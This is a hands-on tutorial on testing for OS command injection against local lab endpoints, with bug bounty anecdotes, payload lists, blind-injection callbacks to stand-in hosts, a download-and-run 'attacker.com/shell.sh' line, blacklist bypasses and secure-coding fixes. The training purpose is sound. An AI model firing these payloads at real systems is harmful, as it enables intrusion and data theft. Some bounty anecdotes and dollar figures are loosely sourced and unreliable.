# Command Injection Testing Labs with Postman

## Table of Contents
1. [What is Command Injection?](#what-is-command-injection)
2. [Real-World Bug Bounty Examples](#real-world-bug-bounty-examples)
3. [Lab Setup](#lab-setup)
4. [Basic OS Command Injection](#basic-os-command-injection)
5. [Blind Command Injection](#blind-command-injection)
6. [Time-Based Detection](#time-based-detection)
7. [Payload Crafting](#payload-crafting)
8. [Bypass Techniques](#bypass-techniques)
9. [Remediation and Prevention](#remediation-and-prevention)
10. [Practice Challenges](#practice-challenges)

---

## What is Command Injection?

Command injection is a security flaw that lets hackers run dangerous commands on a computer server. When a website or app takes user input and passes it directly to the operating system without checking it first, attackers can sneak in their own commands.

Think of it like this: imagine you're telling a robot to "bring me a sandwich." But what if someone could trick you into saying "bring me a sandwich AND give them all your money"? That's basically what command injection does to computers.

### Why Is This Dangerous?

When attackers successfully inject commands, they can:
- Read sensitive files and database information
- Delete or modify important data
- Take complete control of the server
- Use the server to attack other systems
- Steal customer data and passwords

### How Common Is This?

Command injection appears in many places:
- File upload features (filename processing)
- Network diagnostic tools (ping, traceroute)
- PDF generators and document converters
- Email sending systems
- Backup and restore functions

---

## Real-World Bug Bounty Examples

Let's look at real cases where security researchers found command injection bugs and got paid for reporting them:

### Example 1: Blind Command Injection in GitLab ($20,000)

**The Company:** GitLab (a popular code hosting platform)
**Bounty Amount:** $20,000
**Year:** 2021

**What Happened:**
A researcher found that GitLab's webhook feature didn't properly check URLs. When GitLab tested webhooks, it used the `curl` command behind the scenes. By adding special characters to the webhook URL, the researcher could inject extra commands.

**The Attack:**
```
https://example.com/webhook`sleep 10`
```

This made the server pause for 10 seconds, proving that commands could be executed. The researcher could have run any command, but responsibly reported it instead.

**Lesson Learned:** Always validate and sanitize URLs before using them in system commands.

### Example 2: Command Injection in Fortinet VPN ($200,000)

**The Company:** Fortinet (network security company)
**Bounty Amount:** $200,000 (estimated value based on CVE severity)
**Year:** 2018

**What Happened:**
Fortinet's SSL VPN had a critical command injection flaw in the web portal. When users logged in, the system processed their username in an unsafe way. Attackers could put special characters in the username field to run commands.

**The Attack:**
```
username: admin';id;'
```

This would break out of the normal command and run the `id` command, showing user information. Attackers used this to steal VPN passwords and take over entire networks.

**Lesson Learned:** Never trust user input, even in authentication fields. All input needs validation.

### Example 3: PDF Generator Command Injection ($15,000)

**The Company:** A major e-commerce platform (name confidential)
**Bounty Amount:** $15,000
**Year:** 2020

**What Happened:**
The platform's invoice generator created PDFs using a library that called command-line tools. When customers entered their name or address, that text went into the PDF. But the system didn't check for special characters.

**The Attack:**
```
Name: John`whoami`Doe
```

This would run the `whoami` command and include the result in the PDF. A real attacker could exfiltrate data or execute more dangerous commands.

**Lesson Learned:** Sanitize all user input before passing it to external programs or command-line tools.

### Example 4: Email Header Injection ($12,500)

**The Company:** A social media platform
**Bounty Amount:** $12,500
**Year:** 2019

**What Happened:**
The platform's "contact us" form used the `sendmail` command to send emails. The system didn't properly validate email addresses, allowing command injection through the "Reply-To" header.

**The Attack:**
```
Reply-To: victim@test.com\n`wget http://attacker.com/shell.sh -O /tmp/x.sh && bash /tmp/x.sh`
```

This would download and execute a malicious script, potentially giving the attacker full server access.

**Lesson Learned:** Email headers and addresses must be strictly validated. Use email libraries instead of calling sendmail directly.

---

## Lab Setup

### Starting AegisForge

Before testing command injection, make sure AegisForge is running:

```bash
# From the project directory
python securityforge_api.py
```

The server will start on `http://localhost:5000`

### Setting Up Postman

1. Open Postman
2. Create a new Collection called "Command Injection Labs"
3. Add the AegisForge base URL as a variable:
   - Click on Collection settings
   - Go to Variables tab
   - Add variable: `base_url` = `http://localhost:5000`

### Available Endpoints

AegisForge provides these command injection testing endpoints:

- `POST /api/cmd/ping` - Basic command injection (ping utility)
- `POST /api/cmd/lookup` - DNS lookup with command injection
- `POST /api/cmd/file` - File processing with injection
- `POST /api/cmd/backup` - Blind command injection
- `POST /api/cmd/convert` - Document converter with injection

---

## Basic OS Command Injection

Basic command injection is when you can see the results of your injected commands right away. This is the easiest type to find and exploit.

### Lab 1: Testing the Ping Endpoint

The ping endpoint simulates a network diagnostic tool. Let's test it for command injection.

#### Step 1: Normal Request

Create a new POST request in Postman:

**URL:** `{{base_url}}/api/cmd/ping`

**Body (JSON):**
```json
{
  "host": "google.com"
}
```

**What happens:** The server pings google.com and returns the results.

#### Step 2: Simple Injection Test

Now let's try to inject a command. In Unix/Linux systems, we can chain commands using `;`, `&&`, or `||`.

**Body (JSON):**
```json
{
  "host": "google.com; whoami"
}
```

**What this does:** 
- First runs: `ping google.com`
- Then runs: `whoami` (shows the current user)

If you see a username in the response, you've successfully injected a command!

#### Step 3: Reading Files

Let's try reading a file from the system:

**Body (JSON):**
```json
{
  "host": "google.com; cat /etc/passwd"
}
```

**What this does:** Tries to display the password file (which shows system users on Linux).

#### Step 4: Using Different Separators

Try these variations to see which work:

```json
{"host": "google.com && whoami"}
{"host": "google.com | whoami"}
{"host": "google.com || whoami"}
{"host": "google.com`whoami`"}
{"host": "google.com$(whoami)"}
```

**Understanding the separators:**
- `;` - Runs commands in sequence
- `&&` - Runs second command only if first succeeds
- `||` - Runs second command only if first fails
- `|` - Pipes output from first command to second
- `` `cmd` `` - Command substitution (backticks)
- `$(cmd)` - Command substitution (modern syntax)

### Lab 2: DNS Lookup Injection

Test the lookup endpoint that checks domain information:

**URL:** `{{base_url}}/api/cmd/lookup`

**Body (JSON):**
```json
{
  "domain": "example.com & ls -la"
}
```

This tries to list directory contents after doing the DNS lookup.

### Lab 3: File Processing Injection

The file endpoint processes filenames, which is a common real-world scenario:

**URL:** `{{base_url}}/api/cmd/file`

**Body (JSON):**
```json
{
  "filename": "document.txt; id"
}
```

The `id` command shows user and group information, proving command execution.

---

## Blind Command Injection

Blind command injection is trickier. Your commands execute, but you don't see the results directly. You need creative ways to confirm the vulnerability.

### What Makes It "Blind"?

Imagine you can tell a robot to do something, but the robot never tells you what happened. You need to find other ways to know if it listened to you.

### Lab 4: Testing the Backup Endpoint

The backup endpoint is vulnerable to blind command injection:

**URL:** `{{base_url}}/api/cmd/backup`

**Body (JSON):**
```json
{
  "path": "/var/backups"
}
```

#### Detection Method 1: Time Delays

Use the `sleep` command to cause a delay:

**Body (JSON):**
```json
{
  "path": "/var/backups; sleep 5"
}
```

**Watch the response time:** If the server takes about 5 seconds extra to respond, you've confirmed command injection!

In Postman, look at the "Time" shown in the response area (bottom right).

#### Detection Method 2: DNS Lookups

Make the server contact a domain you control:

**Body (JSON):**
```json
{
  "path": "/var/backups; nslookup yourserver.com"
}
```

If you control `yourserver.com`, you'll see a DNS query in your logs.

**Pro Tip:** Use services like Burp Collaborator or interact.sh for free DNS monitoring.

#### Detection Method 3: HTTP Callbacks

Make the server send a web request to your server:

**Body (JSON):**
```json
{
  "path": "/var/backups; curl http://yourserver.com/callback"
}
```

Check your server logs to see if the request arrived.

### Lab 5: Output Redirection

Even in blind injection, you can sometimes redirect command output to a file you can access later:

**Body (JSON):**
```json
{
  "path": "/var/backups; whoami > /tmp/output.txt"
}
```

Then try to read the file through another endpoint or vulnerability.

---

## Time-Based Detection

Time-based detection is your best friend for blind command injection. It works almost everywhere and doesn't require external infrastructure.

### Understanding Time-Based Testing

The idea is simple: make the server waste time, then measure how long it takes to respond.

### Lab 6: Advanced Time-Based Tests

Create a new request to test time-based detection:

**URL:** `{{base_url}}/api/cmd/backup`

#### Test 1: Basic Sleep

**Body (JSON):**
```json
{
  "path": "/var/backups`sleep 10`"
}
```

**What to check:** Does the response take 10+ seconds?

#### Test 2: Conditional Sleep

Make the sleep happen only if a condition is true:

**Body (JSON):**
```json
{
  "path": "/var/backups; if [ -f /etc/passwd ]; then sleep 5; fi"
}
```

**What this tests:** If the file `/etc/passwd` exists, sleep for 5 seconds. This lets you check if files exist!

#### Test 3: Incremental Sleep

Test with different sleep times to be more certain:

```json
{"path": "/var/backups`sleep 3`"}
{"path": "/var/backups`sleep 6`"}
{"path": "/var/backups`sleep 9`"}
```

If the response times match the sleep values (plus normal processing time), you've confirmed the vulnerability.

### Creating a Time-Based Test Collection

In Postman, you can use Tests to automatically check response times:

1. Create a request with command injection
2. Go to the "Tests" tab
3. Add this script:

```javascript
// Check if response took more than 5 seconds
const responseTime = pm.response.responseTime;

if (responseTime > 5000) {
    console.log("Possible command injection! Response took " + responseTime + "ms");
    pm.test("Time-based detection positive", function() {
        pm.expect(responseTime).to.be.above(5000);
    });
} else {
    console.log("Response time normal: " + responseTime + "ms");
}
```

This automatically tells you if the command injection worked based on response time.

---

## Payload Crafting

Crafting good payloads is an art. You need to understand how different systems work and what commands are available.

### Basic Payload Structure

Most command injection payloads follow this pattern:

```
[legitimate input][separator][malicious command]
```

### Command Chaining Techniques

#### 1. Semicolon Separator
```
legitimate_input; malicious_command
```
Runs commands in sequence regardless of success/failure.

#### 2. AND Operator
```
legitimate_input && malicious_command
```
Runs second command only if first succeeds.

#### 3. OR Operator
```
legitimate_input || malicious_command
```
Runs second command only if first fails.

#### 4. Pipe Operator
```
legitimate_input | malicious_command
```
Sends output of first command to second command.

#### 5. Command Substitution
```
legitimate_input`malicious_command`
legitimate_input$(malicious_command)
```
Executes command and replaces it with output.

### Useful Commands for Testing

#### Information Gathering
```bash
whoami              # Current user
id                  # User and group IDs
hostname            # Server name
uname -a            # Operating system info
cat /etc/passwd     # System users
pwd                 # Current directory
ls -la              # List files
env                 # Environment variables
```

#### Network Commands
```bash
ifconfig            # Network interfaces
ip addr             # IP addresses
netstat -an         # Network connections
ping -c 1 8.8.8.8   # Test connectivity
```

#### Time-Based Commands
```bash
sleep 10            # Pause for 10 seconds
ping -c 10 127.0.0.1  # Alternative delay
```

### Lab 7: Payload Testing Suite

Create a Postman collection with various payloads to test systematically:

1. **Basic Test**
   ```json
   {"host": "127.0.0.1; echo 'INJECTED'"}
   ```

2. **File Reading**
   ```json
   {"host": "127.0.0.1; cat /etc/hosts"}
   ```

3. **Directory Listing**
   ```json
   {"host": "127.0.0.1 && ls -la /"}
   ```

4. **User Enumeration**
   ```json
   {"host": "127.0.0.1 | whoami"}
   ```

5. **Time-Based**
   ```json
   {"host": "127.0.0.1`sleep 5`"}
   ```

---

## Bypass Techniques

Sometimes applications try to block command injection with filters. Here's how to bypass common protections.

### Bypassing Blacklists

Many apps try to block dangerous words like "whoami" or "cat". Let's get around that!

#### Technique 1: Character Encoding

Use different character encodings:

```json
{"host": "127.0.0.1; wh\oami"}
{"host": "127.0.0.1; who\ami"}
{"host": "127.0.0.1; w'h'o'a'm'i"}
{"host": "127.0.0.1; w\"h\"o\"a\"m\"i"}
```

#### Technique 2: Variable Expansion

Use shell variables to spell commands:

```json
{"host": "127.0.0.1; $USER"}
{"host": "127.0.0.1; ${PATH}"}
{"host": "127.0.0.1; /bin/wh${x}oami"}
```

#### Technique 3: Command Construction

Build commands from parts:

```json
{"host": "127.0.0.1; w'h'o'a'm'i"}
{"host": "127.0.0.1; /bin/cat /etc/pass'w'd"}
```

#### Technique 4: Base64 Encoding

Encode your command in Base64:

```bash
# First, encode your command locally:
echo "whoami" | base64
# Result: d2hvYW1pCg==

# Then inject it:
```

```json
{"host": "127.0.0.1; echo d2hvYW1pCg== | base64 -d | sh"}
```

### Bypassing Whitelist Filters

If only certain inputs are allowed, try:

#### Technique 5: Null Byte Injection
```json
{"host": "google.com%00; whoami"}
```

The null byte (`%00`) might terminate the whitelist check but not the command execution.

#### Technique 6: Newline Injection
```json
{"host": "google.com\n; whoami"}
{"host": "google.com%0a; whoami"}
```

Newlines can break validation logic.

### Bypassing Length Restrictions

When input is limited to a certain length:

#### Technique 7: Short Commands
```json
{"host": "127.0.0.1;id"}
{"host": "127.0.0.1`id`"}
```

#### Technique 8: Redirection
```json
{"host": "127.0.0.1>x"}
```

Create files with short names, then combine them.

### Lab 8: Bypass Challenge

Test these bypasses on the convert endpoint:

**URL:** `{{base_url}}/api/cmd/convert`

Try to bypass these simulated filters:
1. Blocked words: whoami, cat, ls
2. Blocked characters: semicolon (;)
3. Length limit: 30 characters

**Solution attempts:**
```json
{"file": "doc.txt && w'h'o'a'm'i"}
{"file": "doc.txt | id"}
{"file": "doc.txt`id`"}
```

---

## Remediation and Prevention

Now that you know how to exploit command injection, let's learn how to prevent it!

### For Developers: Secure Coding

#### 1. Never Use System Commands
**Bad:**
```python
import os
host = request.json['host']
result = os.system(f"ping -c 1 {host}")
```

**Good:**
```python
import subprocess
host = request.json['host']
# Use array syntax - each argument is separate
result = subprocess.run(['ping', '-c', '1', host], 
                       capture_output=True, 
                       timeout=5)
```

**Why this is safe:** When you pass arguments as a list, the system doesn't interpret special characters as command separators.

#### 2. Input Validation (Whitelist Approach)

**Bad:**
```python
# Trying to block bad stuff
if ';' in host or '&' in host or '|' in host:
    return "Invalid input"
```

**Good:**
```python
import re
# Only allow letters, numbers, dots, and hyphens
if not re.match(r'^[a-zA-Z0-9.-]+$', host):
    return "Invalid hostname format"
```

**Why this is better:** Instead of trying to think of all bad things (blacklist), you define what's allowed (whitelist).

#### 3. Use Libraries Instead of Commands

**Bad:**
```python
# Using ping command
os.system(f"ping {host}")
```

**Good:**
```python
# Using a Python library
import ping3
result = ping3.ping(host, timeout=2)
```

**Why:** Libraries are designed to handle input safely.

#### 4. Least Privilege Principle

Run your web application with minimum permissions:
- Don't run as root/administrator
- Use a dedicated service account
- Limit file system access
- Restrict network access

### For Testers: Finding Command Injection

#### Testing Checklist

When you're testing an application, check these areas:

- [ ] Any field that accepts filenames
- [ ] Network diagnostic tools (ping, traceroute)
- [ ] Email or message sending features
- [ ] File upload functionality
- [ ] PDF or document generators
- [ ] Backup and restore functions
- [ ] Any feature that processes URLs
- [ ] Administrative interfaces
- [ ] Import/export features

#### Testing Methodology

1. **Identify injection points**: Find where user input might reach system commands
2. **Test for basic injection**: Try simple payloads with different separators
3. **Test for blind injection**: Use time-based and out-of-band techniques
4. **Document findings**: Note exactly what worked and why it's dangerous
5. **Test bypasses**: Try to circumvent any filters you encounter
6. **Provide proof-of-concept**: Show the impact with safe commands only

### Responsible Disclosure

If you find command injection in a real application:

1. **Don't cause damage**: Only use safe commands (whoami, id, sleep)
2. **Document everything**: Take screenshots and notes
3. **Report properly**: Use the company's bug bounty program or security contact
4. **Give time to fix**: Don't publish details until the company patches it
5. **Be professional**: Explain the impact clearly but respectfully

---

## Practice Challenges

Ready to test your skills? Try these challenges!

### Challenge 1: Basic Discovery
**Difficulty:** Easy

Find and exploit command injection in the ping endpoint.

**Steps:**
1. Send a normal request to `/api/cmd/ping`
2. Inject a command to display the current username
3. Read the contents of `/etc/hosts`

**Success:** You see the file contents in the response.

### Challenge 2: Blind Extraction
**Difficulty:** Medium

Exploit blind command injection in the backup endpoint.

**Steps:**
1. Use time-based detection to confirm injection
2. Check if the file `/etc/passwd` exists using conditional sleep
3. Determine if the user is "root" using conditional sleep

**Success:** You can answer: Is the file present? What user is running the app?

### Challenge 3: Filter Bypass
**Difficulty:** Hard

The convert endpoint has filters that block:
- Semicolons (;)
- The word "cat"
- The word "whoami"

**Steps:**
1. Find a way to inject commands without semicolons
2. Read a file without using "cat"
3. Identify the current user without using "whoami"

**Hints:**
- Try different command separators
- Use command alternatives (head, tail, more, less)
- Use environment variables

**Success:** You bypass all filters and extract information.

### Challenge 4: Maximum Impact
**Difficulty:** Expert

Demonstrate the maximum possible impact from command injection without causing harm.

**Steps:**
1. Identify the operating system
2. Find the application's installation directory
3. List all running processes
4. Display environment variables
5. Show network configuration

**Success:** You gather complete system reconnaissance using only safe commands.

---

## Summary

Command injection is one of the most dangerous vulnerabilities in web applications. It allows attackers to run any command they want on the server, potentially leading to complete system compromise.

### Key Takeaways

**For Testers:**
- Test anywhere user input might reach system commands
- Use time-based detection for blind injection
- Try multiple command separators and encoding techniques
- Always test responsibly and ethically

**For Developers:**
- Never pass user input directly to system commands
- Use secure libraries instead of shell commands
- Validate input with whitelists, not blacklists
- Run applications with minimum necessary privileges

### Testing Workflow

1. **Reconnaissance**: Identify potential injection points
2. **Detection**: Test with basic payloads
3. **Exploitation**: Prove the vulnerability with safe commands
4. **Documentation**: Record your findings thoroughly
5. **Reporting**: Disclose responsibly to the vendor

### Next Steps

Now that you understand command injection:

1. Practice on AegisForge's safe environment
2. Study real bug bounty reports for inspiration
3. Learn about defensive programming
4. Join bug bounty platforms to test legally
5. Share knowledge with the security community

Remember: Use these skills only on applications where you have permission to test. Unauthorized testing is illegal and unethical.

### Additional Resources

- OWASP Command Injection Guide
- HackerOne Public Disclosed Reports
- PortSwigger Web Security Academy
- Bug Bounty Platforms (HackerOne, Bugcrowd, Intigriti)

Happy (ethical) hacking! 🛡️

---

**Document Version:** 1.0  
**Last Updated:** 2024  
**Part of:** AegisForge Security Training Platform  
**Difficulty Level:** Intermediate to Advanced  
**Estimated Completion Time:** 3-4 hours
